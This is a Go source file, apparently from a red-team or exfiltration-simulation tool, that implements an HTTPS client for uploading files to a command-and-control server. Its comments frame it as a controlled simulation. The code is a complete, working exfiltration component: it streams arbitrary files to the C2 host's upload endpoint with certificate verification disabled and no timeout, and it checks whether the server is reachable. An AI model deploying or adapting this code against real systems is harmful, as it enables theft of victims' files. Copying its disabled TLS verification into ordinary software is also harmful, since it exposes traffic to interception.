// Package https provides HTTPS client functionality for file exfiltration.
//
// The client uploads files to the C2 server over TLS. It skips certificate
// verification since we're using self-signed certs—this is fine for a
// simulation where we control both endpoints.
package https

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// Client handles HTTPS uploads to the C2 server.
type Client struct {
	serverURL  string
	httpClient *http.Client
}

// NewClient creates a new HTTPS client.
//
// Parameters:
//   - serverIP: C2 server IP address
//   - port: HTTPS port (e.g., 8443)
func NewClient(serverIP string, port int) *Client {
	// Create HTTP client that skips certificate verification
	// This is necessary because we're using self-signed certs
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	return &Client{
		serverURL: fmt.Sprintf("https://%s:%d", serverIP, port),
		httpClient: &http.Client{
			Transport: transport,
			Timeout:   0, // No timeout for large uploads
		},
	}
}

// UploadFile uploads a file to the C2 server.
//
// The file is streamed directly from disk to avoid loading it all into memory.
// Progress is logged during the upload.
func (c *Client) UploadFile(filePath string) error {
	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	// Get file info for size
	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("failed to stat file: %w", err)
	}

	fileSize := fileInfo.Size()
	fileSizeMB := float64(fileSize) / 1024 / 1024

	log.Printf("[HTTPS] Uploading %s (%.2f MB) to %s",
		filepath.Base(filePath), fileSizeMB, c.serverURL)

	// Create request with file as body
	uploadURL := c.serverURL + "/upload"
	req, err := http.NewRequest(http.MethodPost, uploadURL, file)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	// Set headers
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Filename", filepath.Base(filePath))
	req.ContentLength = fileSize

	// Perform upload
	startTime := time.Now()
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("upload failed: %w", err)
	}
	defer resp.Body.Close()

	// Read response
	body, _ := io.ReadAll(resp.Body)

	elapsed := time.Since(startTime)
	mbPerSec := fileSizeMB / elapsed.Seconds()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("upload failed with status %d: %s", resp.StatusCode, string(body))
	}

	log.Printf("[HTTPS] Upload complete! %.2f MB in %v (%.2f MB/s)",
		fileSizeMB, elapsed, mbPerSec)

	return nil
}

// CheckConnection tests if the C2 server is reachable.
func (c *Client) CheckConnection() error {
	healthURL := c.serverURL + "/health"

	resp, err := c.httpClient.Get(healthURL)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("health check failed with status %d", resp.StatusCode)
	}

	return nil
}
